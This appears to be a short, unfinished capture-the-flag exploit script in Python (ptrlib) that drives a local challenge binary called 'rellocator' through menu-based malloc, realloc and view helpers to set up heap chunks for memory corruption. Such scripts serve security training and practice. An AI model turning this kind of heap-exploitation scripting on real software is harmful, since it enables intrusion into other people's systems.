from ptrlib import *

def malloc(index, size, data):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(":\n", str(index))
    sock.sendlineafter(":\n", str(size))
    sock.sendafter(":\n", data)
    return

def realloc(index, size, data):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(":\n", str(index))
    sock.sendlineafter(":\n", str(size))
    if size > 0:
        sock.sendafter(":\n", data)
    return

def view(index):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(":\n", str(index))
    return sock.recvuntil("1) ")[:-3]

sock = Process("./rellocator")
sock.sendlineafter(":\n", "24") # magic size

malloc(0, 0x58, "BBBBBBBBXXXXXXXX")
malloc(1, 0x58, "AAAAAAAAYYYYYYYY")
realloc(0, 0x58, "A" * 0x58)

sock.interactive()
